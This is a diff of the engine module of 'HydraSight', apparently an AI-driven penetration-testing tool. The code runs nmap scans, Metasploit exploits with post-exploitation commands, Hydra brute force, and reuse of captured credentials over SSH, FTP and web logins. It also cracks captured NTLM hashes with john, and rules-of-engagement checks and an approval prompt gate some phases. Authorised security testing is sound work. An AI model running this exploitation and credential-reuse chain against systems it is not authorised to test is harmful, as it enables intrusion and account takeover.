@@ -9,39 +9,52 @@ Changes from Phase 2:
   - _post_exploit_phase() delegates to PostAccessHandler factory.
   - Engagement can conclude professionally without exploitation.
 """
+
 import base64
 import logging
 import time
 from pathlib import Path
-from typing import Optional
 
 from rich.padding import Padding
-from rich.tree    import Tree
+from rich.tree import Tree
 
-from hydrasight.config.defaults import P, PHASE_DEFS, TOOL_LABELS
-from hydrasight.models.findings       import Findings
-from hydrasight.models.roe            import RulesOfEngagement
-from hydrasight.models.planner_state  import PlannerState
-from hydrasight.parsers               import Parser
-from hydrasight.integrations.exploit_db         import ExploitDB
-from hydrasight.integrations.exploit_suggestion import (
-    ExploitSuggestion, ExploitSuggestionProvider, ExecutionMode,
-)
-from hydrasight.integrations.kali_api   import KaliAPI
-from hydrasight.services.ai_client      import AIClient
-from hydrasight.services.dispatcher     import Dispatcher
-from hydrasight.services.verifier       import VerifierService
-from hydrasight.services.post_access    import (
-    PostAccessHandler, PostAccessResult, AccessType,
-)
-from hydrasight.utils.ip_utils          import dedup_ports
-from hydrasight.utils.time_utils        import ts
 from hydrasight.cli.display import (
+    analysis_panel,
     console,
-    div, ok, warn, info, err, hit,
-    spinner, phase_header, task_line, result_line,
-    analysis_panel, raw_output, stats_line, label,
+    div,
+    err,
+    hit,
+    info,
+    label,
+    ok,
+    phase_header,
+    raw_output,
+    result_line,
+    spinner,
+    stats_line,
+    task_line,
+    warn,
 )
+from hydrasight.config.defaults import PHASE_DEFS, P
+from hydrasight.integrations.exploit_suggestion import (
+    ExecutionMode,
+    ExploitSuggestion,
+    ExploitSuggestionProvider,
+)
+from hydrasight.integrations.kali_api import KaliAPI
+from hydrasight.models.findings import Findings
+from hydrasight.models.planner_state import PlannerState
+from hydrasight.models.roe import RulesOfEngagement
+from hydrasight.parsers import Parser
+from hydrasight.services.ai_client import AIClient
+from hydrasight.services.dispatcher import Dispatcher
+from hydrasight.services.post_access import (
+    PostAccessHandler,
+    PostAccessResult,
+)
+from hydrasight.services.verifier import VerifierService
+from hydrasight.utils.ip_utils import dedup_ports
+from hydrasight.utils.time_utils import ts
 
 
 class Engine:
@@ -49,26 +62,33 @@ class Engine:
 
     def __init__(
         self,
-        ai         : AIClient,
-        kali       : KaliAPI,
-        dispatcher : Dispatcher,
-        findings   : Findings,
-        cfg        : dict,
-        log        : logging.Logger,
-        roe        : Optional[RulesOfEngagement] = None,
+        ai: AIClient,
+        kali: KaliAPI,
+        dispatcher: Dispatcher,
+        findings: Findings,
+        cfg: dict,
+        log: logging.Logger,
+        roe: RulesOfEngagement | None = None,
+        session_manager=None,
     ) -> None:
-        self.ai         = ai
-        self.kali       = kali
+        self.ai = ai
+        self.kali = kali
         self.dispatcher = dispatcher
-        self.findings   = findings
-        self.cfg        = cfg
-        self.log        = log
-        self.roe        = roe or RulesOfEngagement.permissive()
-        self.verbosity  = cfg.get("verbosity", 1)
-        self.aborted    = False
+        self.findings = findings
+        self.cfg = cfg
+        self.log = log
+        self.roe = roe or RulesOfEngagement.permissive()
+        self.session_manager = session_manager
+        self.verbosity = cfg.get("verbosity", 1)
+        self.aborted = False
         # Created fresh per engagement in run()
-        self._state     : Optional[PlannerState] = None
-        self._verifier  : Optional[VerifierService] = None
+        self._state: PlannerState | None = None
+        self._verifier: VerifierService | None = None
+
+    def _save_session(self, status: str = "in progress") -> None:
+        """Persist the current session state if a session manager is available."""
+        if self.session_manager and self.findings.has_data:
+            self.session_manager.save_session(self.findings, self._state, status)
 
     # ── ROE helpers ───────────────────────────────────────────────────────────
 
@@ -81,10 +101,7 @@ class Engine:
 
     def _roe_check_runtime(self) -> bool:
         if self.roe.is_runtime_exceeded():
-            warn(
-                f"ROE max runtime ({self.roe.max_runtime_minutes}m) "
-                "exceeded — stopping"
-            )
+            warn(f"ROE max runtime ({self.roe.max_runtime_minutes}m) exceeded — stopping")
             self.log.warning("roe: max runtime exceeded")
             return False
         return True
@@ -101,22 +118,12 @@ class Engine:
             return True
         remaining = self.roe.runtime_remaining_minutes()
         console.print()
-        console.print(
-            f"  [{P.AMBER}]┌─ APPROVAL REQUIRED ─────────────────────────────┐[/]"
-        )
-        console.print(
-            f"  [{P.AMBER}]│[/]  phase     [{P.TEXT}]{phase_id}[/]"
-        )
-        console.print(
-            f"  [{P.AMBER}]│[/]  runtime   [{P.MUTED}]{remaining:.1f} min remaining[/]"
-        )
-        console.print(
-            f"  [{P.AMBER}]└─────────────────────────────────────────────────┘[/]"
-        )
+        console.print(f"  [{P.AMBER}]┌─ APPROVAL REQUIRED ─────────────────────────────┐[/]")
+        console.print(f"  [{P.AMBER}]│[/]  phase     [{P.TEXT}]{phase_id}[/]")
+        console.print(f"  [{P.AMBER}]│[/]  runtime   [{P.MUTED}]{remaining:.1f} min remaining[/]")
+        console.print(f"  [{P.AMBER}]└─────────────────────────────────────────────────┘[/]")
         try:
-            answer = console.input(
-                f"  [{P.AMBER}]approve {phase_id}? (y/N) ›[/] "
-            ).strip().lower()
+            answer = console.input(f"  [{P.AMBER}]approve {phase_id}? (y/N) ›[/] ").strip().lower()
         except (EOFError, KeyboardInterrupt):
             answer = "n"
         approved = answer in ("y", "yes")
@@ -127,16 +134,12 @@ class Engine:
 
     # ── core ask-and-run loop ─────────────────────────────────────────────────
 
-    def _ask_and_run(
-        self, task: str, phase_id: str
-    ) -> tuple[str, str]:
+    def _ask_and_run(self, task: str, phase_id: str) -> tuple[str, str]:
         if self.aborted:
             return "", ""
         if self.verbosity >= 1:
             preview = task if len(task) < 140 else task[:137] + "…"
-            console.print(
-                f"\n  [{P.MUTED}]task[/]    [{P.TEXT}]{preview}[/]"
-            )
+            console.print(f"\n  [{P.MUTED}]task[/]    [{P.TEXT}]{preview}[/]")
         with spinner("waiting for model") as prog:
             prog.add_task("t", total=None)
             ai_resp = self.ai.ask(task)
@@ -162,7 +165,8 @@ class Engine:
             warn(f"ROE: port {args.get('rport')} is blocked — skipping")
             if self._state:
                 self._state.record_phase(
-                    phase_id, False,
+                    phase_id,
+                    False,
                     f"roe blocked port {args.get('rport')}",
                 )
             return tool, ""
@@ -181,9 +185,7 @@ class Engine:
 
         # PlannerState tool tracking
         if self._state:
-            self._state.record_tool_outcome(
-                tool_name, bool(output), len(output)
-            )
+            self._state.record_tool_outcome(tool_name, bool(output), len(output))
 
         analysis = self.ai.ask(
             f"Tool: {tool_name}\nOutput:\n{output[:3000]}\n\n"
@@ -194,16 +196,22 @@ class Engine:
             analysis_panel(analysis)
         stats_line(self.findings)
         self.findings.add_event(
-            phase_id, f"{tool_name} — {len(output)} bytes"
+            phase_id,
+            f"{tool_name} — {len(output)} bytes",
+            tool=tool_name,
+            outcome="success" if output else "empty",
+            bytes_out=len(output),
         )
+        self._save_session()
 
         if self._state:
             self._state.record_phase(
-                phase_id, bool(output),
-                reason    = "" if output else "empty output",
-                tools_used= [tool_name],
-                bytes_out = len(output),
-                duration_s= duration,
+                phase_id,
+                bool(output),
+                reason="" if output else "empty output",
+                tools_used=[tool_name],
+                bytes_out=len(output),
+                duration_s=duration,
             )
         return tool_name, output
 
@@ -213,53 +221,57 @@ class Engine:
         if not output:
             return
         for p in Parser.ports(output):
-            self.findings.add_port(
-                p["port"], p["proto"], p["service"], p["version"]
-            )
+            self.findings.add_port(p["port"], p["proto"], p["service"], p["version"])
             if self._state:
                 self._state.mark_port_explored(p["port"])
         for h in Parser.hashes(output):
             self.findings.add_hash(h["username"], h["lm"], h["ntlm"])
             self.findings.add_cred(
-                h["username"], h["ntlm"],
-                kind="ntlm_hash", source=phase,
+                h["username"],
+                h["ntlm"],
+                kind="ntlm_hash",
+                source=phase,
             )
             if phase == "POST_EXPLOIT":
                 hit(f"hash captured  {h['username']}")
         for c in Parser.hydra_creds(output):
             self.findings.add_cred(
-                c["username"], c["password"],
+                c["username"],
+                c["password"],
                 kind="bruteforce",
                 source=f"hydra-{c['service']}",
             )
-            hit(
-                f"creds found  {c['username']}:{c['password']}"
-                f" on {c['service']}"
-            )
+            hit(f"creds found  {c['username']}:{c['password']} on {c['service']}")
         for d in Parser.dirs(output):
             self.findings.add_dir(d["path"], d["status"])
         for cve in Parser.cves(output):
             ctx = Parser.cve_context(cve, output)
             self.findings.add_vuln(
-                name=cve.upper(), severity="HIGH",
-                description=ctx, cve=cve.upper(),
+                name=cve.upper(),
+                severity="HIGH",
+                description=ctx,
+                cve=cve.upper(),
                 phase=phase,
             )
         if Parser.is_ms17(output) and phase == "SMB_CHECK":
             self.findings.add_vuln(
-                name="MS17-010 EternalBlue", severity="CRITICAL",
-                description=(
-                    "SMBv1 RCE — unauthenticated remote code execution"
-                ),
-                cve="CVE-2017-0144", port=445,
-                phase=phase, source_tool="nmap",
+                name="MS17-010 EternalBlue",
+                severity="CRITICAL",
+                description=("SMBv1 RCE — unauthenticated remote code execution"),
+                cve="CVE-2017-0144",
+                port=445,
+                phase=phase,
+                source_tool="nmap",
                 confidence=0.7,
             )
         if Parser.has_anon_ftp(output) and phase in ("FTP_CHECK", "RECON"):
             self.findings.add_vuln(
-                name="Anonymous FTP Access", severity="MEDIUM",
+                name="Anonymous FTP Access",
+                severity="MEDIUM",
                 description="FTP server allows anonymous login",
-                port=21, phase=phase, source_tool="nmap",
+                port=21,
+                phase=phase,
+                source_tool="nmap",
                 confidence=0.8,
             )
         os_info = Parser.os_info(output)
@@ -275,10 +287,7 @@ class Engine:
         """Run targeted second-pass probes on CRITICAL/HIGH findings."""
         if not self._verifier:
             return
-        unverified = [
-            r for r in self.findings.finding_records
-            if not r.verification_attempted
-        ]
+        unverified = [r for r in self.findings.finding_records if not r.verification_attempted]
         if not unverified:
             return
         info(f"verifying {len(unverified)} finding(s)")
@@ -297,9 +306,7 @@ class Engine:
 
     # ── exploitation ──────────────────────────────────────────────────────────
 
-    def _run_exploit(
-        self, suggestion: ExploitSuggestion, target: str
-    ) -> tuple[bool, str]:
+    def _run_exploit(self, suggestion: ExploitSuggestion, target: str) -> tuple[bool, str]:
         """Execute a single ExploitSuggestion. Returns (success, uid)."""
         # ROE: check module blocking (Metasploit paths)
         if suggestion.execution_mode == ExecutionMode.METASPLOIT:
@@ -319,9 +326,7 @@ class Engine:
         )
 
         # ── non-Metasploit modes ───────────────────────────────────────────
-        if suggestion.execution_mode in (
-            ExecutionMode.BRUTE_FORCE, ExecutionMode.SAFE_AUXILIARY
-        ):
+        if suggestion.execution_mode in (ExecutionMode.BRUTE_FORCE, ExecutionMode.SAFE_AUXILIARY):
             return self._run_auxiliary(suggestion, target)
 
         if suggestion.execution_mode == ExecutionMode.CREDENTIAL_REUSE:
@@ -345,11 +350,11 @@ class Engine:
         tool_call = {
             "tool": "post_exploit",
             "args": {
-                "target"  : target,
-                "module"  : suggestion.msf_module,
-                "rport"   : suggestion.rport,
-                "lport"   : self.cfg["lport"],
-                "payload" : suggestion.msf_payload or None,
+                "target": target,
+                "module": suggestion.msf_module,
+                "rport": suggestion.rport,
+                "lport": self.cfg["lport"],
+                "payload": suggestion.msf_payload or None,
                 "commands": suggestion.post_commands or "getuid;sysinfo",
             },
         }
@@ -360,65 +365,68 @@ class Engine:
         result_line("post_exploit", elapsed, len(output), [])
         raw_output(output, self.verbosity)
         self._ingest(output, "EXPLOIT")
-        sid    = Parser.session_id(output)
-        uid    = Parser.uid(output)
+        sid = Parser.session_id(output)
+        uid = Parser.uid(output)
         opened = "session" in output.lower() and "opened" in output.lower()
         if sid or uid or opened:
             uid = uid or "unknown"
             self.findings.add_session(
-                id=sid, uid=uid, exploit=suggestion.title,
-                payload=suggestion.msf_payload, target=target,
-                module=suggestion.msf_module, rport=suggestion.rport,
+                id=sid,
+                uid=uid,
+                exploit=suggestion.title,
+                payload=suggestion.msf_payload,
+                target=target,
+                module=suggestion.msf_module,
+                rport=suggestion.rport,
             )
             self.findings.add_vuln(
                 name=f"{suggestion.title} — Exploited",
                 severity="CRITICAL",
                 description=f"Session opened as {uid} via {suggestion.title}",
-                cve=suggestion.cve, port=suggestion.rport,
-                phase="EXPLOIT", source_tool="msfconsole",
+                cve=suggestion.cve,
+                port=suggestion.rport,
+                phase="EXPLOIT",
+                source_tool="msfconsole",
                 confidence=1.0,
             )
             # Mark matched FindingRecords as proven
             for rec in self.findings.finding_records:
                 name_low = rec.name.lower()
-                if (
-                    suggestion.title.lower() in name_low
-                    or (suggestion.cve and
-                        suggestion.cve.lower() in name_low)
+                if suggestion.title.lower() in name_low or (
+                    suggestion.cve and suggestion.cve.lower() in name_low
                 ):
                     rec.mark_proven(f"session opened as {uid}")
             self._compromise_banner(
-                target, uid,
+                target,
+                uid,
                 # shim to old banner API
                 {
-                    "name"   : suggestion.title,
-                    "cve"    : suggestion.cve,
-                    "module" : suggestion.msf_module,
-                    "rport"  : suggestion.rport,
+                    "name": suggestion.title,
+                    "cve": suggestion.cve,
+                    "module": suggestion.msf_module,
+                    "rport": suggestion.rport,
                     "payload": suggestion.msf_payload,
                 },
             )
             return True, uid
         return False, ""
 
-    def _run_auxiliary(
-        self, suggestion: ExploitSuggestion, target: str
-    ) -> tuple[bool, str]:
+    def _run_auxiliary(self, suggestion: ExploitSuggestion, target: str) -> tuple[bool, str]:
         """Run a safe auxiliary scanner/brute-force suggestion."""
         if suggestion.msf_module:
             tool_call = {
                 "tool": "post_exploit",
                 "args": {
-                    "target" : target,
-                    "module" : suggestion.msf_module,
-                    "rport"  : suggestion.rport,
-                    "lport"  : self.cfg["lport"],
+                    "target": target,
+                    "module": suggestion.msf_module,
+                    "rport": suggestion.rport,
+                    "lport": self.cfg["lport"],
                     "payload": None,
                     "commands": "",
                 },
             }
         elif suggestion.execution_mode == ExecutionMode.BRUTE_FORCE:
-            svc  = suggestion.target_service.lower()
+            svc = suggestion.target_service.lower()
             tool = f"{svc}_brute" if svc in ("ssh", "ftp") else "ssh_brute"
             tool_call = {
                 "tool": tool,
@@ -435,28 +443,23 @@ class Engine:
         self._ingest(output, "EXPLOIT")
         return bool(output), ""
 
-    def _run_cred_reuse(
-        self, suggestion: ExploitSuggestion, target: str
-    ) -> tuple[bool, str]:
+    def _run_cred_reuse(self, suggestion: ExploitSuggestion, target: str) -> tuple[bool, str]:
         """Try captured credentials against the target service."""
         info("attempting credential reuse (not yet implemented — manual check)")
         return False, ""
 
-    def _run_ssh_access(
-        self, suggestion: ExploitSuggestion, target: str
-    ) -> tuple[bool, str]:
+    def _run_ssh_access(self, suggestion: ExploitSuggestion, target: str) -> tuple[bool, str]:
         """Try captured credentials over SSH."""
         if not self.findings.credentials:
             return False, ""
         cred = self.findings.credentials[0]
         username = cred["username"]
-        secret   = cred["secret"]
-        if self._state and self._state.credential_already_tried(
-            username, secret
-        ):
+        secret = cred["secret"]
+        if self._state and self._state.credential_already_tried(username, secret):
             info(f"credential already tried for {username} — skipping")
             return False, ""
-        self._state and self._state.record_credential_attempt(username, secret)
+        if self._state:
+            self._state.record_credential_attempt(username, secret)
         cmd = (
             f"sshpass -p '{secret}' ssh "
             f"-o StrictHostKeyChecking=no -o ConnectTimeout=8 "
@@ -474,27 +477,24 @@ class Engine:
         if uid or "uid=" in output.lower():
             uid = uid or "unknown"
             self.findings.add_session(
-                uid=uid, exploit="SSH credential reuse",
-                payload="ssh", target=target,
+                uid=uid,
+                exploit="SSH credential reuse",
+                payload="ssh",
+                target=target,
                 username=username,
             )
             hit(f"ssh access as {uid}")
             return True, uid
         return False, ""
 
-    def _run_ftp_access(
-        self, suggestion: ExploitSuggestion, target: str
-    ) -> tuple[bool, str]:
+    def _run_ftp_access(self, suggestion: ExploitSuggestion, target: str) -> tuple[bool, str]:
         """Try captured credentials over FTP."""
         if not self.findings.credentials:
             return False, ""
-        cred     = self.findings.credentials[0]
+        cred = self.findings.credentials[0]
         username = cred["username"]
-        secret   = cred["secret"]
-        cmd = (
-            f"curl -s --connect-timeout 8 "
-            f"ftp://{username}:{secret}@{target}/ 2>&1"
-        )
+        secret = cred["secret"]
+        cmd = f"curl -s --connect-timeout 8 ftp://{username}:{secret}@{target}/ 2>&1"
         task_line("ftp_access")
         with spinner("trying ftp") as prog:
             prog.add_task("t", total=None)
@@ -505,33 +505,33 @@ class Engine:
         raw_output(output, self.verbosity)
         if output and "error" not in output.lower():
             self.findings.add_session(
-                uid=username, exploit="FTP credential access",
-                payload="ftp", target=target,
+                uid=username,
+                exploit="FTP credential access",
+                payload="ftp",
+                target=target,
                 username=username,
             )
             hit(f"ftp access as {username}")
             return True, username
         return False, ""
 
-    def _run_web_login(
-        self, suggestion: ExploitSuggestion, target: str
-    ) -> tuple[bool, str]:
+    def _run_web_login(self, suggestion: ExploitSuggestion, target: str) -> tuple[bool, str]:
         """
         Try captured credentials against common web login forms.
 
         Uses WebAdminHandler (Phase 4) — curl-based credential reuse
         against phpMyAdmin, WordPress, Tomcat Manager, Roundcube.
         """
-        from hydrasight.services.post_access import WebAdminHandler, AccessType
+        from hydrasight.services.post_access import WebAdminHandler
 
         if not self.findings.credentials:
             info("no credentials captured — skipping web login attempt")
             return False, ""
 
         # Pick best credential to try (most recently captured first)
-        cred     = self.findings.credentials[-1]
+        cred = self.findings.credentials[-1]
         username = cred["username"]
-        secret   = cred["secret"]
+        secret = cred["secret"]
 
         # Dedup: skip if already tried this cred on a web path
         if self._state and self._state.credential_already_tried(username, secret):
@@ -544,8 +544,8 @@ class Engine:
         session = {
             "username": username,
             "password": secret,
-            "rport"   : suggestion.rport or 80,
-            "payload" : "web_admin",
+            "rport": suggestion.rport or 80,
+            "payload": "web_admin",
         }
 
         handler = WebAdminHandler(self.log, session)
@@ -553,7 +553,8 @@ class Engine:
         with spinner("trying web login") as prog:
             prog.add_task("t", total=None)
             result = handler.execute(
-                self.dispatcher, target,
+                self.dispatcher,
+                target,
                 lhost=self.kali.local_ip(target),
                 lport=self.cfg.get("lport", 4444),
                 cfg=self.cfg,
@@ -574,23 +575,18 @@ class Engine:
             return True, username
         return False, ""
 
-
-    def _compromise_banner(
-        self, target: str, uid: str, exploit: dict
-    ) -> None:
+    def _compromise_banner(self, target: str, uid: str, exploit: dict) -> None:
         console.print()
         console.print(f"  [{P.BRIGHT}]╔{'═' * 60}╗[/]")
         console.print(
-            f"  [{P.BRIGHT}]║[/]  "
-            f"[bold {P.BRIGHT}]TARGET COMPROMISED[/]"
-            f"{'': <39}[{P.BRIGHT}]║[/]"
+            f"  [{P.BRIGHT}]║[/]  [bold {P.BRIGHT}]TARGET COMPROMISED[/]{'': <39}[{P.BRIGHT}]║[/]"
         )
         console.print(f"  [{P.BRIGHT}]╠{'═' * 60}╣[/]")
         for lbl_str, val, color in [
-            ("host    ", target,                         P.TEXT),
-            ("access  ", uid,                            P.BRIGHT),
-            ("exploit ", exploit["name"][:42],           P.TEXT),
-            ("cve     ", exploit.get("cve", "—")[:42],  P.AMBER),
+            ("host    ", target, P.TEXT),
+            ("access  ", uid, P.BRIGHT),
+            ("exploit ", exploit["name"][:42], P.TEXT),
+            ("cve     ", exploit.get("cve", "—")[:42], P.AMBER),
             ("hashes  ", str(len(self.findings.hashes)), P.BRIGHT),
         ]:
             console.print(
@@ -605,10 +601,7 @@ class Engine:
             self.findings, planner_state=self._state
         )
         # Filter out manual checks and suggestions with no active action
-        actionable = [
-            s for s in suggestions
-            if s.execution_mode != ExecutionMode.MANUAL_CHECK
-        ]
+        actionable = [s for s in suggestions if s.execution_mode != ExecutionMode.MANUAL_CHECK]
         if not actionable:
             info("no exploit candidates matched discovered services")
             manual = ExploitSuggestionProvider.manual_suggestions(self.findings)
@@ -643,23 +636,17 @@ class Engine:
         info("HydraSight has captured available evidence — see findings")
         return False
 
-
     def _post_exploit_phase(self, target: str) -> None:
         if not self.findings.sessions:
             info("no active session — skipping post-exploitation")
             return
-        last   = self.findings.sessions[-1]
-        lhost  = self.kali.local_ip(target)
+        last = self.findings.sessions[-1]
+        lhost = self.kali.local_ip(target)
         base_lport = int(self.cfg.get("lport", 4444))
-        new_lp     = (
-            base_lport + 1 if base_lport < 65534 else base_lport - 1
-        )
+        new_lp = base_lport + 1 if base_lport < 65534 else base_lport - 1
         # Select handler via factory
         handler = PostAccessHandler.for_session(last, self.log)
-        info(
-            f"post-access handler: {handler.access_type.value}  "
-            f"lport {new_lp}"
-        )
+        info(f"post-access handler: {handler.access_type.value}  lport {new_lp}")
         task_line("post_access")
         with spinner("post-exploiting") as prog:
             prog.add_task("t", total=None)
@@ -684,16 +671,19 @@ class Engine:
             stats_line(self.findings)
         self.findings.add_event(
             "POST_EXPLOIT",
-            f"post-access ({handler.access_type.value}) — "
-            f"{len(result.output)} bytes"
+            f"post-access ({handler.access_type.value}) — {len(result.output)} bytes",
+            tool="post_exploit",
+            outcome="success" if result.output else "empty",
+            bytes_out=len(result.output),
         )
+        self._save_session()
         if self._state:
             self._state.record_phase(
-                "POST_EXPLOIT", result.success,
+                "POST_EXPLOIT",
+                result.success,
                 reason=result.notes,
                 bytes_out=len(result.output),
             )
-
 
     # ── hash cracking ─────────────────────────────────────────────────────────
 
@@ -705,24 +695,20 @@ class Engine:
         if not rockyou.exists():
             warn(f"rockyou not found at {rockyou}")
             info(
-                "install: sudo apt install wordlists && "
-                "gunzip /usr/share/wordlists/rockyou.txt.gz"
+                "install: sudo apt install wordlists && gunzip /usr/share/wordlists/rockyou.txt.gz"
             )
             return
-        hash_lines = "\n".join(
-            f"{h['username']}:$NT${h['ntlm']}"
-            for h in self.findings.hashes
-        )
+        hash_lines = "\n".join(f"{h['username']}:$NT${h['ntlm']}" for h in self.findings.hashes)
         b64 = base64.b64encode(hash_lines.encode()).decode()
         cmd = (
             f"HFILE=$(mktemp /tmp/hs_XXXXXX.txt) && "
             f"printf '%s' '{b64}' | base64 -d > \"$HFILE\" && "
             f"john --format=NT --wordlist={rockyou} "
-            f"\"$HFILE\" --pot=/tmp/hs.pot 2>&1 ; "
+            f'"$HFILE" --pot=/tmp/hs.pot 2>&1 ; '
             f"echo '---CRACKED---' ; "
-            f"john --format=NT --show \"$HFILE\" "
+            f'john --format=NT --show "$HFILE" '
             f"--pot=/tmp/hs.pot 2>&1 ; "
-            f"rm -f \"$HFILE\""
+            f'rm -f "$HFILE"'
         )
         info(f"cracking {len(self.findings.hashes)} hashes with john")
         task_line("run_command")
@@ -737,6 +723,7 @@ class Engine:
             warn("john produced no output")
             return
         import re
+
         cracked_users: set[str] = set()
         in_cracked = False
         for line in output.splitlines():
@@ -756,12 +743,9 @@ class Engine:
                 continue
             cracked_users.add(user)
             for h in self.findings.hashes:
-                if (h["username"].lower() == user.lower()
-                        and not h["cracked"]):
+                if h["username"].lower() == user.lower() and not h["cracked"]:
                     h["cracked"] = pw
-            self.findings.add_cred(
-                user, pw, kind="cracked", source="john"
-            )
+            self.findings.add_cred(user, pw, kind="cracked", source="john")
             # Mark associated finding_records as proven
             for rec in self.findings.finding_records:
                 if "hash" in rec.name.lower() or "ntlm" in rec.name.lower():
@@ -773,11 +757,17 @@ class Engine:
         else:
             ok(f"recovered {found} password(s)")
         self.findings.add_event(
-            "HASH_CRACK", f"john completed — {found} cracked"
+            "HASH_CRACK",
+            f"john completed — {found} cracked",
+            tool="john",
+            outcome="success" if found > 0 else "empty",
+            bytes_out=len(output),
         )
+        self._save_session()
         if self._state:
             self._state.record_phase(
-                "HASH_CRACK", found > 0,
+                "HASH_CRACK",
+                found > 0,
                 reason=f"{found} passwords recovered",
             )
 
@@ -797,13 +787,13 @@ class Engine:
           4. validation-only — vulns found but ROE blocks exploit
           5. recon-only      — nothing actionable; report evidence
         """
-        plan     : list[str] = []
-        port_set  = {p["port"]           for p in self.findings.ports}
-        services  = {p["service"].lower() for p in self.findings.ports}
-        has_web   = any(s in services for s in ("http", "https", "http-alt"))
-        has_smb   = 445 in port_set or 139 in port_set
-        has_ssh   = 22  in port_set
-        has_ftp   = 21  in port_set
+        plan: list[str] = []
+        port_set = {p["port"] for p in self.findings.ports}
+        services = {p["service"].lower() for p in self.findings.ports}
+        has_web = any(s in services for s in ("http", "https", "http-alt"))
+        has_smb = 445 in port_set or 139 in port_set
+        has_ssh = 22 in port_set
+        has_ftp = 21 in port_set
         has_creds = bool(self.findings.credentials)
         has_vulns = bool(self.findings.vulns)
         exploit_gated = self.roe.requires_approval("EXPLOIT")
@@ -825,8 +815,7 @@ class Engine:
             self.findings, planner_state=self._state
         )
         has_exploit_suggestions = any(
-            s.execution_mode != ExecutionMode.MANUAL_CHECK
-            for s in suggestions
+            s.execution_mode != ExecutionMode.MANUAL_CHECK for s in suggestions
         )
 
         # Branch 1: credential-led (has creds → try reuse, lower barrier)
@@ -846,26 +835,18 @@ class Engine:
 
         # Branch 4: validation-only (ROE blocks exploit or no suggestions)
         elif has_vulns:
-            self.log.info(
-                "planner: validation-only branch "
-                "(vulns found, no exploit path)"
-            )
+            self.log.info("planner: validation-only branch (vulns found, no exploit path)")
             # No EXPLOIT phase — engagement concludes with evidence report
 
         # Branch 5: recon-only (nothing actionable)
         else:
-            self.log.info(
-                "planner: recon-only branch — no actionable paths found"
-            )
+            self.log.info("planner: recon-only branch — no actionable paths found")
 
         # HASH_CRACK added opportunistically if not already in plan
-        if "HASH_CRACK" not in plan and (
-            has_creds or has_vulns or has_exploit_suggestions
-        ):
+        if "HASH_CRACK" not in plan and (has_creds or has_vulns or has_exploit_suggestions):
             plan.append("HASH_CRACK")
 
         return plan
-
 
     # ── lifecycle ─────────────────────────────────────────────────────────────
 
@@ -887,12 +868,10 @@ class Engine:
         # ── initialise per-engagement state ───────────────────────────────
         self.ai.reset_for_engagement()
         self.dispatcher.canonical_target = target
-        self.aborted             = False
-        self.findings.target     = target
+        self.aborted = False
+        self.findings.target = target
         self.findings.started_at = ts()
-        self._state              = PlannerState(
-            max_retries=self.cfg.get("max_retries", 2)
-        )
+        self._state = PlannerState(max_retries=self.cfg.get("max_retries", 2))
         self._verifier = VerifierService(self.kali, self.log, target)
         self.roe.start_timer()
         t0 = time.time()
@@ -905,9 +884,7 @@ class Engine:
             f"  [{P.MUTED}]{ts()}[/]"
         )
         # Show ROE summary
-        console.print(
-            f"  [{P.DIM}]roe[/]     [{P.MUTED}]{self.roe.summary()}[/]"
-        )
+        console.print(f"  [{P.DIM}]roe[/]     [{P.MUTED}]{self.roe.summary()}[/]")
         div()
 
         # ── reachability check ─────────────────────────────────────────────
@@ -916,15 +893,15 @@ class Engine:
         if check["reachable"]:
             ok(f"target {target} is reachable")
         else:
-            warn(
-                f"target {target} did not respond to ping "
-                "— continuing with -Pn"
-            )
+            warn(f"target {target} did not respond to ping — continuing with -Pn")
 
         # ── initial recon ──────────────────────────────────────────────────
         phase_header(
-            "RECON", PHASE_DEFS["RECON"][0],
-            PHASE_DEFS["RECON"][1], 1, 10,
+            "RECON",
+            PHASE_DEFS["RECON"][0],
+            PHASE_DEFS["RECON"][1],
+            1,
+            10,
         )
         self._ask_and_run(
             f"nmap scan {target} with scan_type -sV -sC "
@@ -936,8 +913,11 @@ class Engine:
         if not self.findings.ports:
             warn("no open ports — trying deep scan")
             phase_header(
-                "DEEP_SCAN", PHASE_DEFS["DEEP_SCAN"][0],
-                PHASE_DEFS["DEEP_SCAN"][1], 2, 10,
+                "DEEP_SCAN",
+                PHASE_DEFS["DEEP_SCAN"][0],
+                PHASE_DEFS["DEEP_SCAN"][1],
+                2,
+                10,
             )
             self._ask_and_run(
                 f"nmap scan {target} with scan_type -sS -sV "
@@ -950,22 +930,19 @@ class Engine:
             err("no open ports discovered after deep scan")
             info("engagement complete — no services found")
             self._final_summary(target, time.time() - t0)
+            self._save_session("completed")
             self.dispatcher.canonical_target = None
             return
 
         # ── adaptive phase planning ────────────────────────────────────────
-        plan  = self._plan_phases()
+        plan = self._plan_phases()
         total = len(plan) + 1
         info(f"adaptive plan: {len(plan)} phases")
-        plan_tree = Tree(
-            f"  [{P.MUTED}]execution plan[/]", guide_style=P.DIM
-        )
+        plan_tree = Tree(f"  [{P.MUTED}]execution plan[/]", guide_style=P.DIM)
         for ph in plan:
             lbl_t = PHASE_DEFS.get(ph, (ph, P.DIM))[0]
             gated = " [approval required]" if self.roe.requires_approval(ph) else ""
-            plan_tree.add(
-                f"[{P.PRIMARY}]{lbl_t}[/]  [{P.DIM}]({ph}){gated}[/]"
-            )
+            plan_tree.add(f"[{P.PRIMARY}]{lbl_t}[/]  [{P.DIM}]({ph}){gated}[/]")
         console.print(Padding(plan_tree, (1, 0, 1, 4)))
 
         # ── execute phases ─────────────────────────────────────────────────
@@ -993,38 +970,39 @@ class Engine:
 
             if phase_id == "FTP_CHECK":
                 port = next(
-                    (p["port"] for p in self.findings.ports
-                     if p["service"] == "ftp"), 21,
+                    (p["port"] for p in self.findings.ports if p["service"] == "ftp"),
+                    21,
                 )
                 self._ask_and_run(
-                    f"run this command: nmap --script ftp-anon,ftp-vuln*"
-                    f" -sV -p {port} {target}",
+                    f"run this command: nmap --script ftp-anon,ftp-vuln* -sV -p {port} {target}",
                     "FTP_CHECK",
                 )
             elif phase_id == "WEB_FINGER":
                 web = next(
-                    (p for p in self.findings.ports
-                     if p["service"] in ("http", "https", "http-alt")),
+                    (
+                        p
+                        for p in self.findings.ports
+                        if p["service"] in ("http", "https", "http-alt")
+                    ),
                     None,
                 )
                 if web:
-                    scheme = (
-                        "https" if "https" in web["service"] else "http"
-                    )
+                    scheme = "https" if "https" in web["service"] else "http"
                     self._ask_and_run(
                         f"whatweb scan {scheme}://{target}:{web['port']}",
                         "WEB_FINGER",
                     )
             elif phase_id == "WEB_DIR":
                 web = next(
-                    (p for p in self.findings.ports
-                     if p["service"] in ("http", "https", "http-alt")),
+                    (
+                        p
+                        for p in self.findings.ports
+                        if p["service"] in ("http", "https", "http-alt")
+                    ),
                     None,
                 )
                 if web:
-                    scheme = (
-                        "https" if "https" in web["service"] else "http"
